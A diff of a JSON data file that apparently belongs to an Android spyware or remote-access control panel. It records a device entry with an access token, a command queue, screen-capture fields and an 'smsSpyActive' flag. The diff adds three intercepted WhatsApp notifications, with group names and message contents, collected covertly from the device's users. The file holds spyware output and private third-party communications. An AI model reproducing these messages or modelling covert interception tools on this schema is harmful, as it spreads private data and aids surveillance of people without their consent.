@@ -2766,7 +2766,7 @@
     "deviceName": "HP-FREE-E7C4",
     "ownerUsername": "rian",
     "token": "3edb01b0f7a259097d52c5b4fdd50348",
-    "lastSeen": 1775201034512,
+    "lastSeen": 1775201037568,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T07:22:21.597Z",
@@ -2782,6 +2782,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗞𝗨𝗪𝗢 𝗫 𝗞𝗜𝗡𝗚 𝗥𝗜𝗖𝗬 #𝟮 (158 pesan): ~ jar",
+        "content": "22 3-5 all kayu fpt no mobi pc",
+        "time": "03/04 14:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201038360
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1412 pesan dari 5 chat",
+        "time": "03/04 14:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201037725
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗞𝗨𝗪𝗢 𝗫 𝗞𝗜𝗡𝗚 𝗥𝗜𝗖𝗬 #𝟭 (7 pesan): ~ joker plenger",
+        "content": "22 2 nvmtps fpt nomacro hp andro only",
+        "time": "03/04 14:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201037664
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
